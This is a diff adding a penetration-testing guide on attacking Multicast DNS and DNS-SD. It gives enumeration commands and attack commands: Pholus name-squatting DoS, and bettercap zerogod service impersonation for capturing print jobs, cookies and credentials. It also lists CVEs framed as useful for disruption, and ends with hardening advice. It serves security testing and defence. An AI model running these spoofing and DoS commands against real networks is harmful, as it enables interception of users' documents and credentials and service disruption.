@@ -1,0 +1,158 @@
+# 5353/UDP Multicast DNS (mDNS) and DNS-SD
+
+## Basic Information
+
+Multicast DNS (mDNS) enables DNS-like name resolution and service discovery inside a local link without a unicast DNS server. It uses UDP/5353 and the multicast addresses 224.0.0.251 (IPv4) and FF02::FB (IPv6). DNS Service Discovery (DNS-SD, typically used with mDNS) provides a standardized way to enumerate and describe services via PTR, SRV and TXT records.
+
+```
+PORT     STATE SERVICE
+5353/udp open  zeroconf
+```
+
+Key protocol details you’ll often leverage during attacks:
+- Names in the .local zone are resolved via mDNS.
+- QU (Query Unicast) bit may request unicast replies even for multicast questions.
+- Implementations should ignore packets not sourced from the local link; some stacks still accept them.
+- Probing/announcing enforces unique host/service names; interfering here creates DoS/“name squatting” conditions.
+
+## DNS-SD service model
+
+Services are identified as _<service>._tcp or _<service>._udp under .local, e.g. _ipp._tcp.local (printers), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), etc. Discover types with _services._dns-sd._udp.local, then resolve discovered instances to SRV/TXT/A/AAAA.
+
+## Network Exploration and Enumeration
+
+- nmap target scan (direct mDNS on a host):
+  ```bash
+  nmap -sU -p 5353 --script=dns-service-discovery <target>
+  ```
+- nmap broadcast discovery (listen to the segment and enumerate all DNS-SD types/instances):
+  ```bash
+  sudo nmap --script=broadcast-dns-service-discovery
+  ```
+- avahi-browse (Linux):
+  ```bash
+  # List service types
+  avahi-browse -bt _services._dns-sd._udp
+  # Browse all services and resolve to host/port
+  avahi-browse -art
+  ```
+- Apple dns-sd (macOS):
+  ```bash
+  # Browse all HTTP services
+  dns-sd -B _http._tcp
+  # Enumerate service types
+  dns-sd -B _services._dns-sd._udp
+  # Resolve a specific instance to SRV/TXT
+  dns-sd -L "My Printer" _ipp._tcp local
+  ```
+- Packet capture with tshark:
+  ```bash
+  # Live capture
+  sudo tshark -i <iface> -f "udp port 5353" -Y mdns
+  # Only DNS-SD service list queries
+  sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
+  ```
+
+Tip: Some browsers/WebRTC use ephemeral mDNS hostnames to mask local IPs. If you see random-UUID.local candidates on the wire, resolve them with mDNS to pivot to local IPs.
+
+## Attacks
+
+### mDNS name probing interference (DoS / name squatting)
+
+During the probing phase, a host checks name uniqueness. Responding with spoofed conflicts forces it to pick new names or fail. This can delay or prevent service registration and discovery.
+
+Example with Pholus:
+```bash
+# Block new devices from taking names by auto-faking responses
+sudo python3 pholus3.py <iface> -afre -stimeout 1000
+```
+
+### Service spoofing and impersonation (MitM)
+
+Impersonate advertised DNS-SD services (printers, AirPlay, HTTP, file shares) to coerce clients into connecting to you. This is especially useful to:
+- Capture documents by spoofing _ipp._tcp or _printer._tcp.
+- Lure clients to HTTP/HTTPS services to harvest tokens/cookies or deliver payloads.
+- Combine with NTLM relay techniques when Windows clients negotiate auth to spoofed services.
+
+With bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):
+```bash
+# Start mDNS/DNS-SD discovery
+sudo bettercap -iface <iface> -eval "zerogod.discovery on"
+
+# Show all services seen from a host
+> zerogod.show 192.168.1.42
+# Show full DNS records for a host (newer bettercap)
+> zerogod.show-full 192.168.1.42
+
+# Impersonate all services of a target host automatically
+> zerogod.impersonate 192.168.1.42
+
+# Save IPP print jobs to disk while impersonating a printer
+> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
+> zerogod.impersonate 192.168.1.42
+
+# Replay previously captured services
+> zerogod.save 192.168.1.42 target.yml
+> zerogod.advertise target.yml
+```
+
+Also see generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows:
+
+### Notes on recent implementation issues (useful for DoS/persistence during engagements)
+
+- Avahi reachable-assertion and D-Bus crash bugs (2023) can terminate avahi-daemon on Linux distributions (e.g. CVE-2023-38469..38473, CVE-2023-1981), disrupting service discovery on target hosts until restart.
+- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) lets adjacent WLAN clients flood crafted mDNS, spiking WLC CPU and dropping AP tunnels—handy if you need to force client roaming or controller resets during an engagement.
+- Apple mDNSResponder logic error DoS (CVE-2024-44183) lets a sandboxed local process crash Bonjour to briefly suppress service publication/lookup on Apple endpoints; patched in current iOS/macOS releases.
+- Apple mDNSResponder correctness issue (CVE-2025-31222) allowed local privilege escalation via mDNSResponder; useful for persistence on unmanaged Macs/iPhones, fixed in recent iOS/macOS updates.
+
+### Browser/WebRTC mDNS considerations
+
+Modern Chromium/Firefox obfuscate host candidates with random mDNS names. You can re-expose LAN IPs on managed endpoints by pushing the Chrome policy `WebRtcLocalIpsAllowedUrls` (or toggling `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/Edge equivalent) so ICE exposes host candidates instead of mDNS; set via `HKLM\Software\Policies\Google\Chrome`.
+
+When users disable the protection manually (common in WebRTC troubleshooting guides), their browsers start advertising plain host candidates again, which you can capture via mDNS or ICE signaling to speed up host discovery.
+
+## Defensive considerations and OPSEC
+
+- Segment boundaries: Don’t route 224.0.0.251/FF02::FB between security zones unless an mDNS gateway is explicitly required. If you must bridge discovery, prefer allowlists and rate limits.
+- Windows endpoints/servers:
+  - To hard-disable name resolution via mDNS set the registry value and reboot:
+    ```
+    HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
+    ```
+  - In managed environments, disable the built-in “mDNS (UDP-In)” Windows Defender Firewall rule (at least on the Domain profile) to prevent inbound mDNS processing while preserving home/roaming functionality.
+  - On newer Windows 11 builds/GPO templates, use the policy “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” and set it to Disabled.
+- Linux (Avahi):
+  - Lock down publishing when not needed: set `disable-publishing=yes`, and restrict interfaces with `allow-interfaces=` / `deny-interfaces=` in `/etc/avahi/avahi-daemon.conf`.
+  - Consider `check-response-ttl=yes` and avoid `enable-reflector=yes` unless strictly required; prefer `reflect-filters=` allowlists when reflecting.
+- macOS: Restrict inbound mDNS at host/network firewalls when Bonjour discovery is not needed for specific subnets.
+- Monitoring: Alert on unusual surges in `_services._dns-sd._udp.local` queries or sudden changes in SRV/TXT of critical services; these are indicators of spoofing or service impersonation.
+
+## Tooling quick reference
+
+- nmap NSE: `dns-service-discovery` and `broadcast-dns-service-discovery`.
+- Pholus: active scan, reverse mDNS sweeps, DoS and spoofing helpers.
+  ```bash
+  # Passive sniff (timeout seconds)
+  sudo python3 pholus3.py <iface> -stimeout 60
+  # Enumerate service types
+  sudo python3 pholus3.py <iface> -sscan
+  # Send generic mDNS requests
+  sudo python3 pholus3.py <iface> --request
+  # Reverse mDNS sweep of a subnet
+  sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
+  ```
+- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).
+
+## Spoofing/MitM
+
+The most interesting attack you can perform over this service is to perform a MitM in the communication between the client and the real server. You might be able to obtain sensitive files (MitM the communication with the printer) or even credentials (Windows authentication).\
+For more information check:
+
+## References
+
+- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
+- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
+- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
+- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
+- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
+- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)
